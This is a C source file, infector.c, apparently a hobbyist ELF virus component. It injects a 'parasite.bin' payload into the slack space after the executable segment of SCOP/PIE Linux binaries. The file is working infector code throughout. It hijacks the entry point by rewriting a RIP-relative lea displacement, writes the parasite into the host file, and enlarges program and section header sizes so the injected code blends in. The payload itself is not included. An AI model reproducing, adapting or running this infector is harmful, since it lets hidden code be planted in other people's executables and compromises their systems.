/*
 * ---------------------------------------------------------------------------
 .________      .________                   .__          .________
 |   ____/__.__.|   ____/     ___.__.______ |  |__  __ __|   ____/
 |____  <   |  ||____  \     <   |  |\____ \|  |  \|  |  \____  \ 
 /       \___  |/       \     \___  ||  |_> >   Y  \  |  /       \
/______  / ____/______  /_____/ ____||   __/|___|  /____/______  /
       \/\/           \/_____/\/     |__|        \/            \/             
 * ---------------------------------------------------------------------------
 * "The struggle itself toward the heights is enough to fill a man's heart.
 * One must imagine Sisyphus happy."
 * -- Albert Camus
 * ---------------------------------------------------------------------------
 * [+] Component : infector.c
 * [+] Author    : 5y5_yphu5
 * [+] Target    : SCOP / PIE Binaries
 * ---------------------------------------------------------------------------
 */


#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <err.h>
#include <elf.h>
#include <libelf.h>
#include <gelf.h>
#include <stddef.h>
#include <inttypes.h>
#include <capstone/capstone.h>
#include <sys/stat.h>
#include <string.h>

#include "infector.h"

bool validate_scop_compliance_and_extract_scop_headers(Elf *elf, ScopHeaders *out_headers) {
    size_t phnum;
    
    if (elf_getphdrnum(elf, &phnum) != 0) {
        warnx("Failed to get program header count: %s", elf_errmsg(-1));
        return false;
    }

    GElf_Phdr temp_loads[MAX_SCOP_LOADS]; 
    int load_count = 0;

    for (size_t i = 0; i < phnum; i++) {
        GElf_Phdr phdr;
        if (gelf_getphdr(elf, i, &phdr) != &phdr) {
            warnx("Failed to retrieve program header %zu: %s", i, elf_errmsg(-1));
            continue;
        }

        if (phdr.p_type == PT_LOAD) {
            temp_loads[load_count] = phdr;
            load_count++;

            if (load_count == MAX_SCOP_LOADS) {
                break;
            }
        }
    }

    if (load_count >= 3) {

        if (temp_loads[0].p_flags == PF_R && 
            temp_loads[1].p_flags == (PF_R | PF_X) && 
            temp_loads[2].p_flags == PF_R) {
            
            for (int i = 0; i < load_count; i++) {
                out_headers->loads[i] = temp_loads[i];
            }
            out_headers->count = load_count;
            
            return true;
        }
    }

    return false;
}

uint64_t calculate_available_slack_space(const ScopHeaders *out_headers) {

    if (!out_headers || out_headers->count < 3) {
        return 0; 
    }

    uint64_t pt_load_two_offset = out_headers->loads[2].p_offset;
    uint64_t pt_load_one_offset = out_headers->loads[1].p_offset;
    uint64_t pt_load_one_file_size = out_headers->loads[1].p_filesz;

    if (pt_load_two_offset < (pt_load_one_offset + pt_load_one_file_size)) {
        return 0;
    }

    uint64_t slack_space = pt_load_two_offset - (pt_load_one_offset + pt_load_one_file_size);
    
    return slack_space;
}

uint64_t injection_vector(const ScopHeaders *out_headers){
    uint64_t pt_load_one_offset = out_headers->loads[1].p_offset;
    uint64_t pt_load_one_file_size = out_headers->loads[1].p_filesz;
    return pt_load_one_offset + pt_load_one_file_size;
}

uint64_t injection_vaddr(const ScopHeaders *out_headers){
    uint64_t pt_load_one_vaddr = out_headers->loads[1].p_vaddr;
    uint64_t pt_load_one_file_size = out_headers->loads[1].p_filesz;
    return pt_load_one_vaddr + pt_load_one_file_size;
}

uint64_t get_elf_entry_point(Elf *elf) {
    if (!elf) {
        return 0;
    }

    GElf_Ehdr ehdr;
    
    if (gelf_getehdr(elf, &ehdr) == NULL) {
        return 0;
    }

    return (uint64_t)ehdr.e_entry;
}

bool extract_entry_opcodes(int fd, const ScopHeaders *out_headers, uint64_t target_vaddr, size_t bytes_to_read, Opcodes *output_opcodes) {

    if (!out_headers || !output_opcodes || bytes_to_read == 0 || bytes_to_read > OPCODES_SIZE) {
        return false;
    }

    for (size_t i = 0; i < out_headers->count; i++) {
        uint64_t vaddr_start = out_headers->loads[i].p_vaddr;
        uint64_t file_size = out_headers->loads[i].p_filesz;

        if (target_vaddr >= vaddr_start && (target_vaddr + bytes_to_read) <= (vaddr_start + file_size)) {
            
            uint64_t file_offset = target_vaddr - vaddr_start + out_headers->loads[i].p_offset;
            
            if (lseek(fd, (off_t)file_offset, SEEK_SET) == (off_t)-1) {
                return false;
            }
            
            ssize_t bytes_read = read(fd, output_opcodes->raw_machine_code, bytes_to_read);
            
            if (bytes_read > 0 && (size_t)bytes_read == bytes_to_read) {
                return true;
            }
            
            return false;
        }
    }
    
    return false;
}


InstructionData find_rip_target(const uint8_t *code, size_t code_size, uint64_t start_address) {
    csh handle;
    cs_insn *insn;
    InstructionData result = {0, 0, 0, 0, 0, 0};

    if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK) {
        fprintf(stderr, "Failed to initialize Capstone\n");
        return result;
    }

    cs_option(handle, CS_OPT_DETAIL, CS_OPT_ON);

    insn = cs_malloc(handle);

    const uint8_t *current_code = code;
    size_t current_size = code_size;
    uint64_t current_address = start_address;

    while (cs_disasm_iter(handle, &current_code, &current_size, &current_address, insn)) {
        
        if (insn->id == X86_INS_LEA) {
            cs_detail *detail = insn->detail;
            
            if (detail->x86.op_count == 2) {
                cs_x86_op *op0 = &(detail->x86.operands[0]);
                cs_x86_op *op1 = &(detail->x86.operands[1]);

                if (op0->type == X86_OP_REG && op1->type == X86_OP_MEM) {
                    
                    if (op1->mem.base == X86_REG_RIP) {

                        result.lea_address = insn->address;   
                        result.lea_size    = insn->size;      
                        

                        result.next_rip = insn->address + insn->size;
                        
                        result.displacement = op1->mem.disp;
                        
                        result.target_address = result.next_rip + result.displacement;
                        
                        result.found = 1;
                        break;
                    }
                }
            }
        }
    }

    cs_free(insn, 1);
    cs_close(&handle);
    
    return result;
}

bool find_section_that_end_at_parasite_start(Elf *elf, uint64_t parasite_offset, GElf_Shdr *out_shdr, size_t *out_index) {
    
    if (!elf || !out_shdr) {
        return false;
    }

    Elf_Scn *scn = NULL;

    while ((scn = elf_nextscn(elf, scn)) != NULL) {
        
        if (gelf_getshdr(scn, out_shdr) != out_shdr) {
            fprintf(stderr, "gelf_getshdr failed: %s\n", elf_errmsg(-1));
            continue;
        }

        if ((out_shdr->sh_offset + out_shdr->sh_size) == parasite_offset) {
            *out_index = elf_ndxscn(scn);
            return true;
        }
    }

    return false;
}

bool load_parasite_file(const char *path, uint8_t *buffer, size_t *out_size) {
    int pfd = open(path, O_RDONLY);
    if (pfd < 0) {
        warn("Failed to open parasite file");
        return false;
    }
    
    struct stat st;
    if (fstat(pfd, &st) != 0) {
        warn("Failed to stat parasite file");
        close(pfd);
        return false;
    }
    
    
    ssize_t n = read(pfd, buffer, st.st_size);
    close(pfd);
    
    if (n != st.st_size) {
        warnx("Failed to read complete parasite");
        return false;
    }
    
    *out_size = (size_t)n;
    return true;
}

bool patch_parasite_delta(uint8_t *parasite, size_t size, int64_t delta) {
    if (size < 8) {
        warnx("Parasite too small to contain delta placeholder");
        return false;
    }
    
    size_t delta_offset = size - 8;
    
    memcpy(&parasite[delta_offset], &delta, sizeof(int64_t));
    
    return true;
}

bool parasite_size_less_then_slack_space(size_t parasite_size, size_t slack_space){
    if (slack_space >= parasite_size){
        return true;
    }

    return false;
}

uint64_t get_pt_load_phdr_offset(Elf *elf, const GElf_Phdr *target_phdr) {

    GElf_Ehdr ehdr;
    if (gelf_getehdr(elf, &ehdr) == NULL) {
        warnx("gelf_getehdr failed");
        return 0;
    }

    size_t phnum;
    if (elf_getphdrnum(elf, &phnum) != 0) {
        warnx("elf_getphdrnum failed");
        return 0;
    }

    for (size_t i = 0; i < phnum; i++) {
        GElf_Phdr phdr;
        if (gelf_getphdr(elf, i, &phdr) != &phdr)
            continue;
        
        if (phdr.p_type   == target_phdr->p_type &&
            phdr.p_offset == target_phdr->p_offset &&
            phdr.p_vaddr  == target_phdr->p_vaddr) {
            return ehdr.e_phoff + i * ehdr.e_phentsize;
        }
    }
    warnx("PT_LOAD[1] not found in program header table");
    return 0;
}

bool patch_host_entry_point(int fd, uint64_t lea_file_offset, 
                            int32_t new_displacement) {
    
    uint64_t disp_offset = lea_file_offset + 3;
    if (lseek(fd, disp_offset, SEEK_SET) == (off_t)-1) {
        warn("lseek to lea displacement failed");
        return false;
    }
    if (write(fd, &new_displacement, sizeof(int32_t)) != sizeof(int32_t)) {
        warn("write new displacement failed");
        return false;
    }
    return true;
}

bool inject_parasite(int host_fd, uint64_t injection_offset,
                     const uint8_t *parasite, size_t parasite_size) {
    if (lseek(host_fd, injection_offset, SEEK_SET) == (off_t)-1) {
        warn("lseek to injection offset failed");
        return false;
    }
    ssize_t written = write(host_fd, parasite, parasite_size);
    if (written < 0 || (size_t)written != parasite_size) {
        warn("inject_parasite: wrote %zd of %zu bytes", written, parasite_size);
        return false;
    }
    return true;
}

bool update_elf_headers(int fd, uint64_t pt_load1_phdr_offset,
                        uint64_t new_filesz, uint64_t new_memsz) {
    
    #define P_FILESZ_OFF 32
    #define P_MEMSZ_OFF  40

    if (lseek(fd, pt_load1_phdr_offset + P_FILESZ_OFF, SEEK_SET) == (off_t)-1) {
        warn("lseek to p_filesz failed");
        return false;
    }
    if (write(fd, &new_filesz, sizeof(uint64_t)) != sizeof(uint64_t)) {
        warn("write p_filesz failed");
        return false;
    }

    if (lseek(fd, pt_load1_phdr_offset + P_MEMSZ_OFF, SEEK_SET) == (off_t)-1) {
        warn("lseek to p_memsz failed");
        return false;
    }
    if (write(fd, &new_memsz, sizeof(uint64_t)) != sizeof(uint64_t)) {
        warn("write p_memsz failed");
        return false;
    }
    return true;
}

bool update_elf_fini_section(int fd, uint64_t fini_section_offset, uint64_t new_sh_size){
    
    #define P_SH_SIZE_OFF 32

    if (lseek(fd, fini_section_offset + P_SH_SIZE_OFF, SEEK_SET) == (off_t)-1) {
        warn("lseek to sh_size failed");
        return false;
    }
    if (write(fd, &new_sh_size, sizeof(uint64_t)) != sizeof(uint64_t)) {
        warn("write p_filesz failed");
        return false;
    }
    return true;
}


uint64_t get_section_header_offset(Elf *elf, size_t shndx) {
    GElf_Ehdr ehdr;
    if (gelf_getehdr(elf, &ehdr) == NULL) {
        warnx("section: gelf_getehdr failed");
        return 0;
    }
    return ehdr.e_shoff + shndx * ehdr.e_shentsize;
}




int main(int argc, char **argv) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <target_elf>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    if (elf_version(EV_CURRENT) == EV_NONE) {
        errx(EXIT_FAILURE, "ELF library initialization failed: %s", elf_errmsg(-1));
    }

    int fd = open(argv[1], O_RDONLY);
    if (fd < 0) {
        err(EXIT_FAILURE, "open failed");
    }

    Elf *elf = elf_begin(fd, ELF_C_READ, NULL);
    if (!elf) {
        errx(EXIT_FAILURE, "elf_begin failed: %s", elf_errmsg(-1));
    }

    if (elf_kind(elf) != ELF_K_ELF) {
        errx(EXIT_FAILURE, "Target is not an ELF object.");
    }

    ScopHeaders out_headers = {0};

    if (validate_scop_compliance_and_extract_scop_headers(elf, &out_headers)) {
        printf("[+] Target is SCOP compliant. 3-stage PT_LOAD text mapping detected.\n");
    } else {
        printf("[-] Target is NOT SCOP compliant. Traditional or custom mapping detected.\n");
    }

    printf("\nExtracted PT_LOAD Segments (%zu total):\n", out_headers.count);

    uint64_t slack_space = calculate_available_slack_space(&out_headers);
    printf("slack space: %llu\n", slack_space);

    uint64_t injection_vector_addr = injection_vector(&out_headers);
    printf("injection vector address: %lX\n", injection_vector_addr);

    uint64_t injection_vaddr_addr = injection_vaddr(&out_headers);
    printf("injection virtual address: %lX\n", injection_vaddr_addr);
    uint64_t e_entry = get_elf_entry_point(elf);
    printf("e_entry: %lX\n", e_entry);

    Opcodes output_opcodes = {0};
    
    size_t bytes_to_read = 40;

    if (extract_entry_opcodes(fd, &out_headers, e_entry, bytes_to_read, &output_opcodes)) {
        printf("\n[+] Successfully extracted %zu bytes at entry point (0x%lX):\n", bytes_to_read, e_entry);
        
        for (size_t i = 0; i < bytes_to_read; i++) {
            printf("%02X ", output_opcodes.raw_machine_code[i]);
        }
        printf("\n");
    } else {
        printf("\n[-] Failed to extract opcodes at entry point.\n");
    }
    
    InstructionData lea_result = find_rip_target(output_opcodes.raw_machine_code, sizeof(output_opcodes.raw_machine_code), e_entry);
    printf("found? %d\n", lea_result.found);
    printf("rip address: %lX\n", lea_result.next_rip);
    printf("main address: %lX\n", lea_result.target_address);
    printf("offset: %lX\n", lea_result.displacement);

    uint64_t parasite_displacement = injection_vaddr_addr - lea_result.next_rip;
    printf("parasite offset patch: %lX\n", parasite_displacement);

    GElf_Shdr target_shdr;
    size_t target_index = 0;
    bool fini_section = find_section_that_end_at_parasite_start(elf, injection_vector_addr, &target_shdr, &target_index);
    if (fini_section) {
        printf("[+] Found target section! offset is: 0x%lX\n", target_shdr.sh_offset);
        printf("[+] Found target section! Size is: 0x%jx\n", (uintmax_t)target_shdr.sh_size);
    } else {
        printf("[-] Target section not found.\n");
    }


    uint8_t parasite_buf[512];
    size_t parasite_size = 0;
    if (!load_parasite_file("parasite.bin", parasite_buf, &parasite_size)) {
        errx(EXIT_FAILURE, "Failed to load parasite.bin");
    }
    printf("[+] Parasite loaded: %zu bytes\n", parasite_size);

    if (!parasite_size_less_then_slack_space(parasite_size, slack_space)) {
        errx(EXIT_FAILURE, "Parasite (%zu bytes) exceeds slack space (%llu bytes)",
             parasite_size, slack_space);
    }

    uint64_t get_rip_runtime_vaddr = injection_vaddr_addr + GET_RIP_OFFSET;
    int64_t delta = (int64_t)lea_result.target_address - (int64_t)get_rip_runtime_vaddr;
    printf("[+] get_rip runtime vaddr: 0x%016llx\n", get_rip_runtime_vaddr);
    printf("[+] delta = 0x%016llx (%lld)\n", delta, delta);

    if (!patch_parasite_delta(parasite_buf, parasite_size, delta)) {
        errx(EXIT_FAILURE, "Failed to patch parasite delta");
    }

    uint64_t lea_file_offset = lea_result.lea_address 
                               - out_headers.loads[1].p_vaddr 
                               + out_headers.loads[1].p_offset;
    printf("[+] lea file offset: 0x%llx\n", lea_file_offset);

    uint64_t pt_load1_phdr_offset = get_pt_load_phdr_offset(elf, &out_headers.loads[1]);
    uint64_t fini_section_offset = get_section_header_offset(elf, target_index);
    if (pt_load1_phdr_offset == 0) {
        errx(EXIT_FAILURE, "Could not determine PT_LOAD[1] PHDR offset");
    }
    printf("[+] PT_LOAD[1] PHDR offset: 0x%llx\n", pt_load1_phdr_offset);

    uint64_t new_filesz = out_headers.loads[1].p_filesz + parasite_size;
    uint64_t new_memsz  = out_headers.loads[1].p_memsz + parasite_size;

    uint64_t new_sh_size = target_shdr.sh_size + parasite_size;

    int32_t new_lea_disp = (int32_t)(injection_vaddr_addr - lea_result.next_rip);
    printf("[+] new lea displacement: 0x%08x (%d)\n", new_lea_disp, new_lea_disp);

    GElf_Ehdr ehdr;
    uint64_t e_shoff = 0, e_shentsize = 0;
    if (gelf_getehdr(elf, &ehdr) != NULL) {
        e_shoff     = ehdr.e_shoff;
        e_shentsize = ehdr.e_shentsize;
    } else {
        warnx("Failed to read ELF header for section patching – skipping sh_size update");
    }
    elf_end(elf);
    close(fd);

    fd = open(argv[1], O_RDWR);
    if (fd < 0) {
        err(EXIT_FAILURE, "Failed to reopen target for writing");
    }

    if (!patch_host_entry_point(fd, lea_file_offset, new_lea_disp)) {
        errx(EXIT_FAILURE, "Failed to patch entry point");
    }

    if (!inject_parasite(fd, injection_vector_addr, parasite_buf, parasite_size)) {
        errx(EXIT_FAILURE, "Failed to inject parasite");
    }

    if (!update_elf_headers(fd, pt_load1_phdr_offset, new_filesz, new_memsz)) {
        errx(EXIT_FAILURE, "Failed to update ELF program headers");
    }

    if (!update_elf_fini_section(fd, fini_section_offset,new_sh_size)) {
        errx(EXIT_FAILURE, "Failed to update ELF section fini header");
    }

    close(fd);
    printf("[+] Infection completed successfully.\n");
    return EXIT_SUCCESS;
}